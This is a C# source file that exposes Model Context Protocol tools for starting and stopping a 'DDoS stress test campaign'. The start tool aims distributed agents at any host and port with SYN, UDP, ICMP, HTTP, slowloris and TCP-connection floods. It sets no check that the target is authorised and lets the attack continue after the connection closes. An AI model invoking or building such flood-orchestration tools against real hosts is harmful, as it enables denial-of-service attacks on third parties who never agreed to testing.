using System.ComponentModel;
using System.Text.Json;
using ModelContextProtocol.Server;
using LibraNextgen.Service.Services;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Service.Mcp;

[McpServerToolType]
public sealed class StressTools
{
    [McpServerTool, Description("Start a DDoS stress test campaign")]
    public static async Task<string> start_stress_test(
        StressTestService stressService,
        [Description("Campaign name")] string name,
        [Description("Target host (IP or domain)")] string targetHost,
        [Description("Target port")] int targetPort,
        [Description("Comma-separated methods: httpFlood,synFlood,udpFlood,icmpFlood,slowloris,tcpConnFlood")] string methods,
        [Description("Comma-separated agent IDs to use")] string agentIds,
        [Description("Duration in seconds")] int durationSeconds = 60,
        [Description("Threads per agent")] int threads = 4,
        [Description("Packet size in bytes")] int packetSize = 1024)
    {
        var methodList = methods.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();
        var agentList = agentIds.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries).ToList();

        if (methodList.Count == 0) return "No valid methods provided";
        if (agentList.Count == 0) return "No agent IDs provided";

        var request = new StressStartRequest
        {
            Name = name,
            TargetHost = targetHost,
            TargetPort = targetPort,
            Methods = methodList,
            AgentIds = agentList,
            DurationSeconds = durationSeconds,
            ContinueAfterClose = true,
            ThreadsPerAgent = threads,
            PacketSize = packetSize,
        };

        var campaign = await stressService.CreateAsync(request, "mcp-client");
        return JsonSerializer.Serialize(new { campaign.Id, campaign.Status });
    }

    [McpServerTool, Description("Stop a running stress test campaign")]
    public static async Task<string> stop_stress_test(
        StressTestService stressService,
        [Description("Campaign ID to stop")] string campaignId)
    {
        stressService.UpdateStatus(campaignId, CampaignStatus.Stopped);
        return "Campaign stopped";
    }
}
